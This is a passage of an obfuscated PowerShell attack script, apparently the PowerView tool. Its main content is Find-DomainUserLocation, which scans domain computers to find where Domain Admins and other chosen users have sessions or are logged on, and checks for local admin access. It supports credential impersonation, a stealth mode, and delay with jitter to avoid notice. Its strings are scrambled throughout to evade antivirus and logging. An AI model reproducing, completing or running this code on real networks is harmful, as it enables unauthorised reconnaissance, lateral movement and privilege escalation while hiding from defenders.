                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $SleepSeconds = 100
        Write-Verbose ('[New'+'-Th'+'reade'+'dFunction]'+' '+'Waiti'+'ng'+' '+"$SleepSeconds "+'sec'+'onds '+'for'+' '+'f'+'inal '+'cl'+'eanu'+'p..'+'.')

        
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $Pool.Dispose()
        Write-Verbose ("{7}{5}{8}{3}{10}{4}{9}{11}{0}{1}{2}{6}" -f'ads c','o','mple','Func',' ','w-Thread','ted','[Ne','ed','all','tion]',' thre')
    }
}


function Find-DomainUserLocation {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{4}{0}{3}" -f 'e','PSShouldPr','o','ss','c'}, '')]
    [OutputType({"{6}{2}{3}{0}{4}{5}{1}"-f 'rView.Use','ion','ow','e','rLoc','at','P'})]
    [CmdletBinding(DefaultParameterSetName = {"{3}{2}{1}{0}"-f'ntity','Ide','rGroup','Use'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{0}{1}" -f'am','e','DNSHostN'})]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias({"{2}{1}{0}" -f'ined','onstra','Unc'})]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{3}{1}{2}" -f'e','atingSyste','m','r','Op'})]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'S','ePack','ervic'})]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'S','iteName'})]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = "use`RI`Dentity")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [Parameter(ParameterSetName = "USErG`ROUPId`eNtI`TY")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'Gr','o','upName'}, {"{1}{0}" -f'roup','G'})]
        [String[]]
        $UserGroupIdentity = ("{0}{4}{3}{2}{1}" -f'Dom','ins','Adm','n ','ai'),

        [Alias({"{3}{2}{1}{0}"-f't','Coun','dmin','A'})]
        [Switch]
        $UserAdminCount,

        [Alias({"{2}{3}{1}{0}"-f 'n','egatio','A','llowDel'})]
        [Switch]
        $UserAllowDelegation,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{4}{0}{3}" -f'le','Do','mai','r','nControl'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{1}{0}{2}"-f'Lev','One','el'}, {"{2}{0}{1}" -f'bt','ree','Su'})]
        [String]
        $SearchScope = ("{1}{0}"-f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Parameter(ParameterSetName = "S`hOWaLl")]
        [Switch]
        $ShowAll,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet('DFS', 'DC', {"{0}{1}" -f 'Fi','le'}, 'All')]
        $StealthSource = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            ("{1}{0}{2}" -f 'er','Prop','ties') = ("{0}{3}{2}{1}"-f 'd','name','ost','nsh')
        }
        if ($PSBoundParameters[("{1}{0}"-f 'omain','D')]) { $ComputerSearcherArguments[("{0}{1}{2}"-f 'D','o','main')] = $Domain }
        if ($PSBoundParameters[("{0}{3}{2}{1}" -f 'Co','ain','erDom','mput')]) { $ComputerSearcherArguments[("{1}{0}"-f 'in','Doma')] = $ComputerDomain }
        if ($PSBoundParameters[("{3}{4}{0}{2}{1}" -f 'rLDAPFilt','r','e','Comp','ute')]) { $ComputerSearcherArguments[("{2}{3}{1}{0}" -f'r','ilte','LDAP','F')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[("{3}{0}{2}{4}{1}" -f'm','e','pu','Co','terSearchBas')]) { $ComputerSearcherArguments[("{1}{0}{2}{3}"-f 'earch','S','Bas','e')] = $ComputerSearchBase }
        if ($PSBoundParameters[("{4}{3}{2}{0}{1}"-f 'tr','ained','ns','nco','U')]) { $ComputerSearcherArguments[("{3}{0}{1}{2}" -f'c','on','strained','Un')] = $Unconstrained }
        if ($PSBoundParameters[("{2}{6}{5}{1}{0}{3}{4}" -f 'yst','ingS','Compu','e','m','perat','terO')]) { $ComputerSearcherArguments[("{0}{1}{2}"-f'Operati','ngSyst','em')] = $OperatingSystem }
        if ($PSBoundParameters[("{0}{2}{1}{4}{3}"-f'Co','ServiceP','mputer','k','ac')]) { $ComputerSearcherArguments[("{1}{2}{0}"-f'ck','ServiceP','a')] = $ServicePack }
        if ($PSBoundParameters[("{2}{1}{0}{3}{4}" -f'erSi','t','Compu','te','Name')]) { $ComputerSearcherArguments[("{1}{2}{0}"-f'eName','Si','t')] = $SiteName }
        if ($PSBoundParameters[("{1}{0}{2}" -f'erve','S','r')]) { $ComputerSearcherArguments[("{1}{0}" -f 'rver','Se')] = $Server }
        if ($PSBoundParameters[("{0}{1}{2}" -f 'Searc','h','Scope')]) { $ComputerSearcherArguments[("{2}{1}{0}"-f 'Scope','arch','Se')] = $SearchScope }
        if ($PSBoundParameters[("{0}{2}{1}" -f'Re','eSize','sultPag')]) { $ComputerSearcherArguments[("{3}{0}{1}{2}" -f 'es','ultPa','geSize','R')] = $ResultPageSize }
        if ($PSBoundParameters[("{4}{1}{2}{0}{3}" -f'imeLim','erver','T','it','S')]) { $ComputerSearcherArguments[("{2}{0}{3}{1}"-f'r','eLimit','Serve','Tim')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}{2}"-f 'Tom','bst','one')]) { $ComputerSearcherArguments[("{0}{1}{2}"-f'To','mbst','one')] = $Tombstone }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Creden','t','ial')]) { $ComputerSearcherArguments[("{1}{2}{0}"-f 'dential','C','re')] = $Credential }

        $UserSearcherArguments = @{
            ("{0}{2}{1}"-f'Prop','ties','er') = ("{4}{1}{3}{0}{2}"-f 'oun','m','tname','acc','sa')
        }
        if ($PSBoundParameters[("{3}{2}{1}{0}"-f 'ty','nti','serIde','U')]) { $UserSearcherArguments[("{1}{2}{0}"-f'ty','Id','enti')] = $UserIdentity }
        if ($PSBoundParameters[("{0}{1}"-f'D','omain')]) { $UserSearcherArguments[("{0}{1}"-f'Domai','n')] = $Domain }
        if ($PSBoundParameters[("{2}{0}{1}"-f'Doma','in','User')]) { $UserSearcherArguments[("{1}{0}{2}" -f 'm','Do','ain')] = $UserDomain }
        if ($PSBoundParameters[("{1}{0}{3}{2}"-f 'serLDA','U','lter','PFi')]) { $UserSearcherArguments[("{1}{2}{0}"-f 'ter','LDAPFi','l')] = $UserLDAPFilter }
        if ($PSBoundParameters[("{4}{0}{1}{2}{3}" -f'e','r','SearchB','ase','Us')]) { $UserSearcherArguments[("{2}{0}{1}"-f 'r','chBase','Sea')] = $UserSearchBase }
        if ($PSBoundParameters[("{3}{0}{1}{2}{4}"-f 'ser','Ad','minC','U','ount')]) { $UserSearcherArguments[("{2}{1}{0}{3}" -f 'Co','dmin','A','unt')] = $UserAdminCount }
        if ($PSBoundParameters[("{1}{6}{5}{0}{2}{3}{4}"-f 'lowDeleg','Use','a','t','ion','Al','r')]) { $UserSearcherArguments[("{3}{2}{0}{1}{4}"-f 'a','t','Deleg','Allow','ion')] = $UserAllowDelegation }
        if ($PSBoundParameters[("{0}{1}"-f 'S','erver')]) { $UserSearcherArguments[("{0}{2}{1}" -f 'Ser','er','v')] = $Server }
        if ($PSBoundParameters[("{2}{0}{3}{1}" -f'hSc','e','Searc','op')]) { $UserSearcherArguments[("{2}{0}{1}" -f'Sco','pe','Search')] = $SearchScope }
        if ($PSBoundParameters[("{3}{0}{1}{2}"-f 'Page','S','ize','Result')]) { $UserSearcherArguments[("{0}{3}{2}{1}" -f 'R','ltPageSize','su','e')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{2}{0}{1}" -f 'v','erTimeLimit','r','Se')]) { $UserSearcherArguments[("{0}{3}{2}{1}" -f 'ServerTi','t','eLimi','m')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}{2}" -f'Tombsto','n','e')]) { $UserSearcherArguments[("{2}{0}{1}"-f'to','ne','Tombs')] = $Tombstone }
        if ($PSBoundParameters[("{3}{2}{0}{1}" -f 'en','tial','d','Cre')]) { $UserSearcherArguments[("{2}{0}{1}"-f 'tia','l','Creden')] = $Credential }

        $TargetComputers = @()

        
        if ($PSBoundParameters[("{0}{1}{3}{2}" -f'Com','pu','e','terNam')]) {
            $TargetComputers = @($ComputerName)
        }
        else {
            if ($PSBoundParameters[("{0}{2}{1}" -f'S','h','tealt')]) {
                Write-Verbose ('['+'F'+'i'+'nd-D'+'omainUserLocation] '+'S'+'te'+'alth '+'enumerat'+'io'+'n '+'using'+' '+'sourc'+'e'+': '+"$StealthSource")
                $TargetComputerArrayList = New-Object System.Collections.ArrayList

                if ($StealthSource -match (('FileL1OAll').RePLace('L1O','|'))) {
                    Write-Verbose ("{2}{13}{10}{11}{8}{4}{1}{6}{0}{3}{12}{9}{7}{5}" -f 'ry','n] Qu','[','ing','catio','rs','e','le serve','UserLo','or fi','nd-Do','main',' f','Fi')
                    $FileServerSearcherArguments = @{}
                    if ($PSBoundParameters[("{0}{1}"-f'Do','main')]) { $FileServerSearcherArguments[("{0}{1}" -f 'D','omain')] = $Domain }
                    if ($PSBoundParameters[("{3}{1}{0}{4}{2}"-f 'mpu','o','erDomain','C','t')]) { $FileServerSearcherArguments[("{1}{0}"-f 'main','Do')] = $ComputerDomain }
                    if ($PSBoundParameters[("{3}{0}{1}{2}" -f'rSea','rch','Base','Compute')]) { $FileServerSearcherArguments[("{0}{1}{2}" -f'Searc','hB','ase')] = $ComputerSearchBase }
                    if ($PSBoundParameters[("{0}{1}"-f'S','erver')]) { $FileServerSearcherArguments[("{1}{0}" -f'ver','Ser')] = $Server }
                    if ($PSBoundParameters[("{0}{3}{1}{2}" -f'S','hSc','ope','earc')]) { $FileServerSearcherArguments[("{1}{2}{0}" -f 'cope','Searc','hS')] = $SearchScope }
                    if ($PSBoundParameters[("{1}{3}{0}{2}"-f 'ultPage','R','Size','es')]) { $FileServerSearcherArguments[("{2}{0}{1}" -f 'esultPageSiz','e','R')] = $ResultPageSize }
                    if ($PSBoundParameters[("{2}{1}{0}" -f 'imit','erTimeL','Serv')]) { $FileServerSearcherArguments[("{0}{2}{1}{3}{4}"-f'Serv','me','erTi','Li','mit')] = $ServerTimeLimit }
                    if ($PSBoundParameters[("{1}{0}{2}" -f'ston','Tomb','e')]) { $FileServerSearcherArguments[("{0}{2}{1}"-f'T','one','ombst')] = $Tombstone }
                    if ($PSBoundParameters[("{2}{1}{0}" -f'tial','reden','C')]) { $FileServerSearcherArguments[("{0}{2}{1}" -f'C','ntial','rede')] = $Credential }
                    $FileServers = Get-DomainFileServer @FileServerSearcherArguments
                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                    $TargetComputerArrayList.AddRange( $FileServers )
                }
                if ($StealthSource -match ((("{1}{2}{0}" -f'll','DFSA','5cA')).rEpLaCE(([cHAR]65+[cHAR]53+[cHAR]99),[StRIng][cHAR]124))) {
                    Write-Verbose ("{5}{7}{4}{9}{2}{0}{1}{8}{3}{10}{6}"-f ' Querying for ','D','ion]','v','m','[F','s','ind-Do','FS ser','ainUserLocat','er')
                    
                    
                }
                if ($StealthSource -match ((("{1}{0}{3}{2}"-f'T8','DCe','l','Al')).REPlAce('eT8',[STrING][chAR]124))) {
                    Write-Verbose ("{11}{14}{1}{4}{5}{12}{13}{15}{9}{2}{0}{3}{16}{10}{6}{8}{17}{7}" -f'] Qu','d-D','n','ery','oma','i','m','ers','ain contro','o','for do','[F','nUser','Lo','in','cati','ing ','ll')
                    $DCSearcherArguments = @{
                        ("{1}{0}" -f 'DAP','L') = $True
                    }
                    if ($PSBoundParameters[("{2}{1}{0}" -f 'in','oma','D')]) { $DCSearcherArguments[("{2}{0}{1}" -f'a','in','Dom')] = $Domain }
                    if ($PSBoundParameters[("{0}{1}{4}{3}{2}"-f 'Co','mpu','in','Doma','ter')]) { $DCSearcherArguments[("{1}{0}"-f'ain','Dom')] = $ComputerDomain }
                    if ($PSBoundParameters[("{2}{0}{1}"-f 'e','r','Serv')]) { $DCSearcherArguments[("{1}{0}" -f'er','Serv')] = $Server }
                    if ($PSBoundParameters[("{2}{0}{1}"-f 'r','edential','C')]) { $DCSearcherArguments[("{0}{1}{2}" -f 'Creden','t','ial')] = $Credential }
                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                    $TargetComputerArrayList.AddRange( $DomainControllers )
                }
                $TargetComputers = $TargetComputerArrayList.ToArray()
            }
            else {
                Write-Verbose ("{17}{8}{16}{1}{0}{4}{13}{6}{2}{7}{5}{10}{12}{15}{11}{9}{14}{3}"-f 'ion] ','UserLocat','g f','domain','Qu','r al','n','o','nd-Dom','s ','l co','uter','m','eryi','in the ','p','ain','[Fi')
                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ("{11}{5}{7}{8}{9}{4}{1}{10}{3}{6}{0}{12}{2}"-f'nd to enu','N','e',' hosts ','ocation] ','d-D','fou','oma','inUser','L','o','[Fin','merat')
        }

        
        if ($PSBoundParameters[("{1}{0}{2}" -f'e','Cred','ntial')]) {
            $CurrentUser = $Credential.GetNetworkCredential().UserName
        }
        else {
            $CurrentUser = ([Environment]::UserName).ToLower()
        }

        
        if ($PSBoundParameters[("{1}{0}" -f 'All','Show')]) {
            $TargetUsers = @()
        }
        elseif ($PSBoundParameters[("{2}{0}{1}" -f 's','erIdentity','U')] -or $PSBoundParameters[("{3}{0}{1}{2}" -f 'L','DA','PFilter','User')] -or $PSBoundParameters[("{0}{1}{4}{3}{2}" -f 'User','Sea','e','hBas','rc')] -or $PSBoundParameters[("{1}{0}{3}{2}{4}" -f'se','U','dminCo','rA','unt')] -or $PSBoundParameters[("{4}{0}{2}{1}{5}{3}" -f 'serAllo','lega','wDe','n','U','tio')]) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                ("{1}{2}{0}" -f 'tity','Id','en') = $UserGroupIdentity
                ("{1}{0}{2}"-f'e','R','curse') = $True
            }
            if ($PSBoundParameters[("{1}{0}{2}"-f's','U','erDomain')]) { $GroupSearcherArguments[("{1}{0}{2}" -f 'm','Do','ain')] = $UserDomain }
            if ($PSBoundParameters[("{1}{2}{0}{3}" -f'e','Us','erS','archBase')]) { $GroupSearcherArguments[("{1}{0}{2}"-f'earch','S','Base')] = $UserSearchBase }
            if ($PSBoundParameters[("{1}{0}{2}" -f'erv','S','er')]) { $GroupSearcherArguments[("{0}{1}{2}"-f'S','e','rver')] = $Server }
            if ($PSBoundParameters[("{3}{1}{2}{0}" -f 'ope','ch','Sc','Sear')]) { $GroupSearcherArguments[("{2}{1}{0}{3}" -f 'rchSc','ea','S','ope')] = $SearchScope }
            if ($PSBoundParameters[("{0}{1}{2}"-f 'Re','s','ultPageSize')]) { $GroupSearcherArguments[("{2}{0}{3}{4}{1}"-f'esu','e','R','l','tPageSiz')] = $ResultPageSize }
            if ($PSBoundParameters[("{2}{3}{1}{0}" -f 'mit','meLi','Ser','verTi')]) { $GroupSearcherArguments[("{2}{0}{1}"-f'erver','TimeLimit','S')] = $ServerTimeLimit }
            if ($PSBoundParameters[("{0}{2}{1}"-f'Tom','ne','bsto')]) { $GroupSearcherArguments[("{1}{2}{0}" -f'mbstone','T','o')] = $Tombstone }
            if ($PSBoundParameters[("{0}{1}{2}" -f 'Creden','t','ial')]) { $GroupSearcherArguments[("{0}{2}{1}"-f 'Creden','l','tia')] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length) "
        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw ("{1}{5}{4}{13}{6}{3}{0}{10}{8}{2}{12}{7}{11}{14}{9}"-f'serLoc','[','o','mainU','ind','F','Do','e','i','t','at','rs found to','n] No us','-',' targe')
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)

            if ($TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = Get-NetSession -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.UserName
                        $CName = $Session.CName

                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }

                        
                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\$$')) {

                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                $UserLocation = New-Object PSObject
                                $UserLocation | Add-Member Noteproperty ("{2}{0}{1}"-f'mai','n','UserDo') $Null
                                $UserLocation | Add-Member Noteproperty ("{2}{1}{0}"-f 'e','am','UserN') $UserName
                                $UserLocation | Add-Member Noteproperty ("{0}{1}{2}"-f 'C','ompu','terName') $TargetComputer
                                $UserLocation | Add-Member Noteproperty ("{1}{2}{0}{3}" -f'onFr','Se','ssi','om') $CName

                                
                                try {
                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $UserLocation | Add-Member NoteProperty ("{2}{3}{1}{0}" -f'me','a','S','essionFromN') $CnameDNSName
                                }
                                catch {
                                    $UserLocation | Add-Member NoteProperty ("{0}{1}{3}{2}" -f'Sess','i','omName','onFr') $Null
                                }

                                
                                if ($CheckAccess) {
                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin
                                    $UserLocation | Add-Member Noteproperty ("{0}{2}{1}" -f'L','alAdmin','oc') $Admin.IsAdmin
                                }
                                else {
                                    $UserLocation | Add-Member Noteproperty ("{2}{3}{0}{1}"-f'lAdm','in','Lo','ca') $Null
                                }
                                $UserLocation.PSObject.TypeNames.Insert(0, ("{4}{1}{2}{3}{0}{5}{6}" -f 'UserLo','r','Vi','ew.','Powe','cati','on'))
                                $UserLocation
                            }
                        }
                    }
                    if (-not $Stealth) {
                        
                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.UserName
                            $UserDomain = $User.LogonDomain

                            
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$')) {
                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = New-Object PSObject
                                    $UserLocation | Add-Member Noteproperty ("{0}{3}{1}{2}"-f'U','erD','omain','s') $UserDomain
                                    $UserLocation | Add-Member Noteproperty ("{0}{1}"-f 'UserN','ame') $UserName
                                    $UserLocation | Add-Member Noteproperty ("{3}{0}{2}{1}" -f'mp','ame','uterN','Co') $TargetComputer
                                    $UserLocation | Add-Member Noteproperty ("{2}{1}{0}" -f 'ress','dd','IPA') $IPAddress
                                    $UserLocation | Add-Member Noteproperty ("{1}{2}{3}{0}" -f 'om','Ses','si','onFr') $Null
                                    $UserLocation | Add-Member Noteproperty ("{2}{1}{3}{0}"-f 'ame','ionFro','Sess','mN') $Null

                                    
                                    if ($CheckAccess) {
                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer
                                        $UserLocation | Add-Member Noteproperty ("{3}{0}{2}{1}" -f 'lA','min','d','Loca') $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | Add-Member Noteproperty ("{1}{0}{2}"-f 'lAd','Loca','min') $Null
                                    }
                                    $UserLocation.PSObject.TypeNames.Insert(0, ("{4}{0}{1}{3}{2}"-f'o','we','View.UserLocation','r','P'))
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[("{2}{1}{0}"-f 'ntial','rede','C')]) {
            if ($PSBoundParameters[("{0}{1}"-f 'D','elay')] -or $PSBoundParameters[("{0}{1}{2}"-f'StopOnSucce','s','s')]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[("{1}{0}"-f 'y','Dela')] -or $PSBoundParameters[("{2}{1}{0}{3}"-f 'pOnSucces','to','S','s')]) {

            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('['+'Find-Do'+'mai'+'nUser'+'L'+'ocation'+'] '+'De'+'lay: '+"$Delay, "+'Ji'+'tter: '+"$Jitter")
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count)) "
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose ("{5}{7}{14}{6}{2}{1}{10}{8}{9}{12}{4}{0}{13}{11}{3}" -f',','rLoc','nUse','y','nd','[Fi','mai','n','rget us','er fo','ation] Ta','g earl','u',' returnin','d-Do')
                    return
                }
            }
        }
        else {
            Write-Verbose ('[Fin'+'d-DomainU'+'serLoc'+'at'+'ion] '+'U'+'si'+'ng '+'threadi'+'ng'+' '+'with'+' '+'thre'+'ads:'+' '+"$Threads")
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "

            
            $ScriptParams = @{
                ("{2}{0}{1}" -f 'rgetUse','rs','Ta') = $TargetUsers
                ("{2}{0}{1}"-f'r','rentUser','Cu') = $CurrentUser
                ("{2}{0}{1}" -f'lt','h','Stea') = $Stealth
                ("{2}{1}{0}" -f'ndle','nHa','Toke') = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-DomainProcess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}" -f'ould','PSSh','ocess','Pr'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{6}{2}{1}{4}{5}{3}" -f'PS','T','dential','e','y','p','UsePSCre'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{7}{3}{5}{6}{4}"-f'PS','voi','A','ngPlainTextFo','ssword','rP','a','dUsi'}, '')]
    [OutputType({"{0}{2}{1}{3}"-f'PowerV','.U','iew','serProcess'})]
    [CmdletBinding(DefaultParameterSetName = {"{0}{1}"-f'N','one'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}{2}{3}"-f'DNS','Ho','s','tName'})]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias({"{0}{3}{1}{2}"-f 'Unconstr','ne','d','ai'})]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}" -f 'per','ating','O','System'})]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}"-f 'ice','k','Serv','Pac'})]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'e','iteNam','S'})]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = "ta`RGETpR`O`CeSS")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,

        [Parameter(ParameterSetName = "Tar`GE`TUSER")]
        [Parameter(ParameterSetName = "US`eRi`De`NTIty")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [Parameter(ParameterSetName = "TARG`e`TuSer")]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [Parameter(ParameterSetName = "T`A`RgEt`UseR")]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [Parameter(ParameterSetName = "T`AR`GEt`User")]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'me','roupNa','G'}, {"{0}{1}" -f'Gr','oup'})]
        [String[]]
        $UserGroupIdentity = ("{4}{3}{2}{1}{0}"-f 'dmins','in A','ma','o','D'),

        [Parameter(ParameterSetName = "Tar`GETUs`Er")]
        [Alias({"{2}{1}{0}"-f'unt','dminCo','A'})]
        [Switch]
        $UserAdminCount,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}"-f 'Do','oller','mainCont','r'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{1}{0}{2}" -f 'n','O','eLevel'}, {"{1}{0}{2}"-f'u','S','btree'})]
        [String]
        $SearchScope = ("{0}{2}{1}"-f 'Su','tree','b'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            ("{2}{0}{1}"-f 'rtie','s','Prope') = ("{0}{3}{1}{2}"-f'dn','tn','ame','shos')
        }
        if ($PSBoundParameters[("{1}{0}{2}" -f'a','Dom','in')]) { $ComputerSearcherArguments[("{0}{1}{2}"-f'Do','mai','n')] = $Domain }
        if ($PSBoundParameters[("{4}{0}{2}{1}{3}"-f'p','erD','ut','omain','Com')]) { $ComputerSearcherArguments[("{1}{0}" -f 'ain','Dom')] = $ComputerDomain }
        if ($PSBoundParameters[("{2}{5}{1}{4}{0}{3}"-f'l','DAP','Compute','ter','Fi','rL')]) { $ComputerSearcherArguments[("{0}{1}{2}"-f 'LDA','PFilte','r')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[("{1}{0}{5}{3}{2}{4}"-f 'mput','Co','h','rSearc','Base','e')]) { $ComputerSearcherArguments[("{2}{0}{1}" -f 'hBas','e','Searc')] = $ComputerSearchBase }
        if ($PSBoundParameters[("{1}{2}{0}{3}"-f 'straine','U','ncon','d')]) { $ComputerSearcherArguments[("{3}{2}{0}{1}" -f 'ra','ined','nconst','U')] = $Unconstrained }
        if ($PSBoundParameters[("{0}{3}{2}{1}{4}" -f 'ComputerOper','ng','ti','a','System')]) { $ComputerSearcherArguments[("{4}{3}{1}{0}{2}"-f 'e','atingSyst','m','er','Op')] = $OperatingSystem }
        if ($PSBoundParameters[("{4}{1}{0}{3}{2}" -f'uterServic','p','Pack','e','Com')]) { $ComputerSearcherArguments[("{1}{0}{2}"-f'eP','Servic','ack')] = $ServicePack }
